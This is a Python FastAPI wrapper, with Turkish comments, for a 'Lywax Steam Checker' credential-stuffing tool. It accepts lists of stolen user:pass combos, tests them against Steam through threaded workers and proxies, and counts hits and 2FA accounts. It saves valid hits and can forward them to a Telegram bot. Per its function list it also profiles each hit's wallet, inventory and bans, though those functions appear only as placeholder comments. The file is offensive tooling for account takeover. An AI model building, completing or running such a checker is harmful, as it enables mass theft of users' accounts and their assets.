# checker_api.py
from fastapi import FastAPI, HTTPException, BackgroundTasks, Body
from pydantic import BaseModel
import uvicorn
import threading
from queue import Queue
import requests
import re
import os
import sys
import time
import base64
import random
import json
import binascii
from collections import Counter
from datetime import datetime
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5

# ────────────────────────────────────────────────
# Orijinal kodun büyük kısmı buraya kopyalanıyor
# ────────────────────────────────────────────────

# Renkler, stats, config, COUNTRY_MAP, lock vs. hepsi aynı kalıyor
G = '\033[92m'
R = '\033[91m'
Y = '\033[93m'
C = '\033[96m'
W = '\033[0m'
B = '\033[1m'
DEBUG = False

stats = {"HIT": 0, "BAD": 0, "2FA": 0, "TOTAL": 0, "CHECKED": 0, "running": False}
config = {"save_file": False, "send_telegram": False, "bot_token": "", "chat_id": ""}
PRODUCER = "Lywax"
lock = threading.Lock()

# COUNTRY_MAP (tamamı aynı, kısalttım)
COUNTRY_MAP = { ... }  # senin orijinal listen buraya gelecek

# ────────────────────────────────────────────────
# Orijinal fonksiyonların TAMAMI buraya geliyor
# clear, send_tg, print_banner, format_proxy, get_profile_details,
# get_account_security, get_all_bans, get_all_inventory_items,
# get_country, get_account_creation_date, get_badge_count,
# get_steam_points, get_friend_count, get_cs2_prime_status,
# get_steam_level, get_owned_games, get_inventory_summary,
# get_wallet_balance, check_account, worker
# ────────────────────────────────────────────────

# (Yukarıdaki tüm fonksiyonları olduğu gibi kopyala, değişiklik yapma)

# ────────────────────────────────────────────────
# FastAPI kısmı başlıyor
# ────────────────────────────────────────────────

app = FastAPI(title="Lywax Steam Checker API v3", version="3.0")

class StartCheckRequest(BaseModel):
    combos: list[str]                     # ["user:pass", "user2:pass2", ...]
    threads: int = 10
    proxies: list[str] = []               # opsiyonel
    save_file: bool = False
    send_telegram: bool = False
    telegram_bot_token: str = ""
    telegram_chat_id: str = ""

class ConfigUpdateRequest(BaseModel):
    save_file: bool = None
    send_telegram: bool = None
    telegram_bot_token: str = None
    telegram_chat_id: str = None

@app.get("/status")
async def get_status():
    return {
        "running": stats["running"],
        "checked": stats["CHECKED"],
        "total": stats["TOTAL"],
        "hit": stats["HIT"],
        "bad": stats["BAD"],
        "2fa": stats["2FA"],
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }

@app.get("/hits")
async def get_hits():
    # all_hits.txt varsa son 50 satırı dön (veya hepsini, dikkat et boyut)
    try:
        with open("Lywax Steam Hits/all_hits.txt", "r", encoding="utf-8") as f:
            lines = f.readlines()[-50:]
        return {"recent_hits": [line.strip() for line in lines if line.strip()]}
    except:
        return {"recent_hits": []}

@app.post("/update-config")
async def update_config(req: ConfigUpdateRequest):
    if req.save_file is not None:
        config["save_file"] = req.save_file
    if req.send_telegram is not None:
        config["send_telegram"] = req.send_telegram
    if req.telegram_bot_token:
        config["bot_token"] = req.telegram_bot_token
    if req.telegram_chat_id:
        config["chat_id"] = req.telegram_chat_id
    
    return {"message": "Config güncellendi", "current_config": config}

@app.post("/start-check")
async def start_check(request: StartCheckRequest, background_tasks: BackgroundTasks):
    if stats["running"]:
        raise HTTPException(status_code=429, detail="Zaten bir tarama çalışıyor")

    if not request.combos:
        raise HTTPException(status_code=400, detail="Combo listesi boş")

    config["save_file"] = request.save_file
    config["send_telegram"] = request.send_telegram
    if request.telegram_bot_token:
        config["bot_token"] = request.telegram_bot_token
    if request.telegram_chat_id:
        config["chat_id"] = request.telegram_chat_id

    # Stats sıfırla
    stats["HIT"] = stats["BAD"] = stats["2FA"] = stats["CHECKED"] = 0
    stats["TOTAL"] = len(request.combos)
    stats["running"] = True

    q = Queue()
    for combo in request.combos:
        q.put(combo.strip())

    proxies = [format_proxy(p) for p in request.proxies if p.strip()]

    # Arka planda worker'ları başlat
    def run_check():
        for _ in range(min(request.threads, 50)):  # max 50 thread güvenlik için
            threading.Thread(target=worker, args=(q, proxies), daemon=True).start()
        q.join()
        stats["running"] = False

    background_tasks.add_task(run_check)

    return {
        "message": "Tarama başladı",
        "total": stats["TOTAL"],
        "threads": request.threads,
        "proxies_count": len(proxies)
    }

# Render için entrypoint
if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=int(os.getenv("PORT", 8000)))
